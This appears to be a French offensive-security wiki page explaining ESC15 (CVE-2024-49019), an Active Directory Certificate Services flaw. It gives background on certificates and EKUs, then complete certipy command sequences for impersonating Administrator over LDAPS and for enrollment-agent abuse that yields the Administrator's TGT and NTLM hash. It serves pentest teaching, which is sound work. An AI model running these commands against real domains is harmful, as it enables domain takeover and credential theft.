# ESC15

***

## <mark style="color:red;">ESC15 (CVE-2024-49019 "EKUwu")</mark>

***

### <mark style="color:blue;">📖 1. Les Bases : le monde des certificats (ADCS)</mark>

#### <mark style="color:green;">🔐 Qu’est-ce qu’un certificat ?</mark>

* Un **certificat numérique X.509** est un fichier signé par une **autorité de certification (CA)** qui :
  * identifie une entité (utilisateur, serveur)
  * donne certains **droits cryptographiques** (authentification, signature, etc.)

#### <mark style="color:green;">🧱 Composants principaux d’un certificat :</mark>

| Élément                            | Description                                                  |
| ---------------------------------- | ------------------------------------------------------------ |
| **Subject**                        | Nom de la personne ou machine à qui appartient le certificat |
| **SAN** (Subject Alternative Name) | D’autres identifiants comme UPN (`user@domain.local`)        |
| **Public Key**                     | Clé publique associée à l’identité                           |
| **Extensions**                     | Fonctions autorisées (par EKU ou Application Policies)       |
| **Signature**                      | Le CA signe le tout pour certifier son authenticité          |

***

#### 🏛️ Qu’est-ce qu’un CA (Certificate Authority) ?

* Un **CA** est un **serveur Windows** qui gère la délivrance de certificats.
* Dans un environnement Active Directory, il s'agit de **Active Directory Certificate Services (ADCS)**.

***

### <mark style="color:blue;">🧾 2. Qu’est-ce qu’un CSR (Certificate Signing Request) ?</mark>

> **CSR = une demande de certificat.**

#### <mark style="color:green;">🔧 Contenu d’un CSR :</mark>

| Élément                 | Exemple                          |
| ----------------------- | -------------------------------- |
| Subject                 | `CN=administrator`               |
| SAN                     | `UPN=administrator@corp.local`   |
| Public Key              | Clé publique RSA ou ECC          |
| Extensions optionnelles | Application Policies, EKUs, etc. |

Un **CSR est envoyé au CA** → le CA le **valide** et renvoie un certificat signé.

***

### <mark style="color:blue;">🧩 3. Qu’est-ce que l’EKU et les Application Policies ?</mark>

#### <mark style="color:green;">✅ EKU (Extended Key Usage)</mark>

* Indique **à quoi sert un certificat**.
* C’est un champ dans le certificat contenant une ou plusieurs **OID** (Object Identifier).

**🔑 OID importants :**

| But                            | Nom                         | OID                      |
| ------------------------------ | --------------------------- | ------------------------ |
| S’authentifier comme client    | `Client Authentication`     | `1.3.6.1.5.5.7.3.2`      |
| Certificat de serveur          | `Server Authentication`     | `1.3.6.1.5.5.7.3.1`      |
| Agent de demande de certificat | `Certificate Request Agent` | `1.3.6.1.4.1.311.20.2.1` |
| Usage illimité                 | `Any Purpose`               | `2.5.29.37.0`            |

***

#### <mark style="color:green;">📘 Application Policies vs EKU</mark>

* **EKU** = ce que le certificat est **autorisé à faire** selon le template.
* **Application Policies** = extension similaire, **parfois interprétée différemment** par Windows (ex: Schannel, KDC).
* Sur les **Templates V1**, le CA **copie automatiquement** les EKU → Application Policies.

Mais...

👉 **Si tu modifies directement Application Policies dans le CSR**, **le CA V1 vulnérable ne le filtre pas !** (c’est la faille ESC15)

***

### <mark style="color:blue;">🧨 4. Qu’est-ce que ESC15 (CVE-2024-49019) ?</mark>

#### 💣 Résumé

> ESC15 = **faille logique** dans le traitement des CSR sur des **templates V1** avec `Enrollee Supplies Subject`.

Le CA :

* **lit les Application Policies injectées dans le CSR**
* **les ajoute au certificat final**, même si le **template ne les autorise pas**

***

#### <mark style="color:green;">🧷 Conditions nécessaires :</mark>

| Élément                             | Explication                                                                 |
| ----------------------------------- | --------------------------------------------------------------------------- |
| CA non patché                       | Pas de correctif de Nov. 2024                                               |
| Template V1                         | Template simple, pas de validation des Application Policies                 |
| `Enrollee Supplies Subject` = TRUE  | Permet à l’attaquant de définir `Subject`, `SAN`, et ajouter des extensions |
| L’attaquant a le droit d’enrôlement | Doit pouvoir demander un certificat                                         |

***

### <mark style="color:blue;">🧬 5. Exemple de scénario offensif complet</mark>

***

#### <mark style="color:green;">🎭 Cas 1 : Se faire passer pour Administrator via Schannel</mark>

***

**🧾 Étape 1 – Demande de certificat piégé**

```bash
certipy req \
  -u 'attacker@corp.local' -p 'Passw0rd!' \
  -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
  -ca 'CORP-CA' -template 'WebServer' \
  -upn 'administrator@corp.local' \
  -sid 'S-1-5-21-...-500' \
  -application-policies 'Client Authentication'
```

➡️ Cela injecte un certificat qui :

* A pour SAN : `administrator@corp.local`
* Contient l’OID `Client Authentication` → peut être utilisé pour se connecter à LDAPS

***

**🔑 Étape 2 – Authentification sur LDAPS**

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.100 -ldap-shell
```

Tu es maintenant **authentifié comme `Administrator` via certificat**, sans mot de passe ni hash. ✅

***

#### <mark style="color:green;">🧙‍♂️ Cas 2 : Abus d'agent d’enrôlement (ESC3-like)</mark>

***

**🧾 Étape 1 – Obtenir un certificat "Certificate Request Agent"**

```bash
certipy req \
  -u 'attacker@corp.local' -p 'Passw0rd!' \
  -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
  -ca 'CORP-CA' -template 'WebServer' \
  -application-policies 'Certificate Request Agent'
```

***

**🧾 Étape 2 – Demander un certificat pour `Administrator`**

```bash
certipy req \
  -u 'attacker@corp.local' -p 'Passw0rd!' \
  -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
  -ca 'CORP-CA' -template 'User' \
  -pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```

***

**🔐 Étape 3 – Obtenir un TGT via PKINIT**

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.100
```

➡️ Tu as maintenant :

* Le **TGT** de l’administrateur
* Son **hash NTLM**
* Et **contrôle total**

***

### <mark style="color:blue;">🔎 6. Comment détecter les templates vulnérables ?</mark>

```bash
certipy find -u attacker@corp.local -p 'Passw0rd!' -dc-ip 10.0.0.100
```

Cherche :

* `Schema Version: 1`
* `Enrollee Supplies Subject: True`
* `User Enrollable Principals` → ton user présent
* `[*] Remarks ESC15`

***
